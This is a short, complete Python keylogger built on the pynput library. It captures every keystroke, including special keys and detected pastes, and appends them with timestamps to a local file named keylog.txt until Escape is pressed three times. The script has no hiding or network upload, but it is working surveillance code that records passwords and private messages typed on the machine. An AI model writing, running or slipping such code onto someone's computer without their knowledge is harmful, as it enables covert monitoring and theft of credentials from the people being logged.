from pynput.keyboard import Listener, Key
from datetime import datetime
import time

buffer = ""
last_key_time = time.time()
exit_counter = 0  # Declare here

# Log session start
with open("keylog.txt", "a") as f:
    f.write(f"\n=== Session Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")

def log_buffer():
    global buffer
    if buffer.strip():  # only log if there's real input
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        with open("keylog.txt", "a") as f:
            f.write(f"{timestamp} {buffer}\n")
        buffer = ""

def log_keystroke(key):
    global buffer, last_key_time, exit_counter

    current_time = time.time()
    time_diff = current_time - last_key_time

    # Auto log buffer if user paused > 10 seconds
    if time_diff > 10:
        log_buffer()

    last_key_time = current_time

    # Handle exit on 3 presses of ESC
    if key == Key.esc:
        exit_counter += 1
        if exit_counter >= 3:
            print("Exiting keylogger...")
            log_buffer()
            return False  # Stops listener
    else:
        exit_counter = 0

    try:
        if key == Key.enter:
            buffer += "[ENTER]"
            log_buffer()
        elif key == Key.space:
            buffer += " "
        elif key == Key.tab:
            buffer += "[TAB]"
        elif key == Key.backspace:
            buffer += "[BACKSPACE]"
        elif key == Key.shift or key == Key.shift_r:
            buffer += "[SHIFT]"
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            buffer += "[CTRL]"
        elif key == Key.alt_l or key == Key.alt_r:
            buffer += "[ALT]"
        elif key == Key.cmd:
            buffer += "[CMD]"
        elif key == Key.up:
            buffer += "[UP]"
        elif key == Key.down:
            buffer += "[DOWN]"
        elif key == Key.left:
            buffer += "[LEFT]"
        elif key == Key.right:
            buffer += "[RIGHT]"
        elif hasattr(key, 'char') and key.char is not None:
            # Detect paste: Ctrl + V sequence in buffer
            if key.char.lower() == 'v' and '[CTRL]' in buffer[-10:]:
                buffer += "[PASTE]"
            else:
                buffer += key.char
        else:
            buffer += f"[{key}]"

    except Exception as e:
        print(f"Error: {e}")

# Run listener
with Listener(on_press=log_keystroke) as listener:
    listener.join()
